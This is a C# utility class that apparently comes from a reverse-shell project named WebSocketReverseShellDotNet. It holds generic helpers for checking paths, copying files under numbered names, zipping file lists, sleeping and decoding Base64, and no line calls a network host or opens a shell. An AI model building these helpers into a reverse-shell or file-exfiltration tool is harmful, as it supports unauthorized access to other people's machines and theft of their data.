using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net.Http;
using System.Reflection;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using WebSocketReverseShellDotNet.model;
using WebSocketReverseShellDotNet.service.commands;

namespace WebSocketReverseShellDotNet.utils
{
    internal static class OSUtil
    {


        public static string GetSystemTempDir()
        {
            return Path.GetTempPath();
        }



        public static bool FileExists(string path)
        {
            // Expand environment variables in the path
            string expandedPath = Environment.ExpandEnvironmentVariables(path);

            // Check if the expanded path represents an existing file
            return File.Exists(expandedPath);
        }

        public static bool DirectoryExists(string path)
        {
            // Expand environment variables in the path
            string expandedPath = Environment.ExpandEnvironmentVariables(path);

            // Check if the expanded path represents an existing file
            return Directory.Exists(expandedPath);
        }




        public static string CopyFileWithNumberPreAppended(string sourcePath, string destinationDirectory, int fileNumber)
        {

 
            if (FileExists(sourcePath))
            {
                string fileName = Path.GetFileName(sourcePath);
                string newFileName = $"{fileNumber}_{fileName}";
                string destinationPath = Path.Combine(destinationDirectory, newFileName);
                try
                {
                    if (File.Exists(destinationPath) )
                    {
                        File.Delete(destinationPath);

                    }


                    // Move the file to the new directory
                    File.Copy(Environment.ExpandEnvironmentVariables(sourcePath), destinationPath);

                    return destinationPath;
                }
                catch (Exception ex)
                {
                    Console.WriteLine(($"Error moving file: {ex.Message}"));
                    return "";
                }
            }
            else
            {
                Console.WriteLine(($"The file '{sourcePath}' does not exist."));
                return  "";
            }
        }

        public static FileInfo? ZipFiles(List<string> files, string outputDirectory, string zipFileName)
        {
            try
            {
                // Ensure the output directory exists
                if (!Directory.Exists(outputDirectory))
                {
                    Directory.CreateDirectory(outputDirectory);
                }

                // Combine the output directory and zip file name to get the full path
                string outputPath = Path.Combine(outputDirectory, zipFileName);

                // Check if the file already exists
                if (File.Exists(outputPath))
                {
                    File.Delete(outputPath); // Delete the existing file
                }

                // Create a new zip file
                using (ZipArchive zipArchive = ZipFile.Open(outputPath, ZipArchiveMode.Update))
                {
                    foreach (string filePath in files)
                    {
                        // Ensure the file exists before adding it to the zip archive
                        if (File.Exists(filePath))
                        {
                            // Create an entry in the zip archive for the file
                            zipArchive.CreateEntryFromFile(filePath, Path.GetFileName(filePath));
                        }
                        else
                        {
                            /*Console.WriteLine($"File not found: {filePath}");*/
                        }
                        if (zipArchive.Entries.Count == 0) return null;
                    }
                }


                // Return FileInfo for the created zip file
                return new FileInfo(outputPath);
            }
            catch (Exception ex)
            {
                // Handle any exceptions that may occur during zipping
                Console.WriteLine($"Error zipping files: {ex.Message}");
                return null;
            }
        }

        public static void WaitInSeconds(int seconds)
        {
            /*Console.WriteLine($"Waiting {seconds} seconds...");*/
            Thread.Sleep(seconds * 1000); // Convert seconds to milliseconds
        }

        public static string DecodeBase64(string base64EncodedData)
        {
            try
            {
                // Convert Base64 string to byte array
                byte[] base64EncodedBytes = Convert.FromBase64String(base64EncodedData);

                // Convert the byte array to a string
                return System.Text.Encoding.UTF8.GetString(base64EncodedBytes);
            }
            catch (FormatException e)
            {
                // Handle the case where the string is not in valid Base64 format
                Console.WriteLine("Input string is not a valid Base64 string: " + e.Message);
                return null;
            }
        }

    }
}
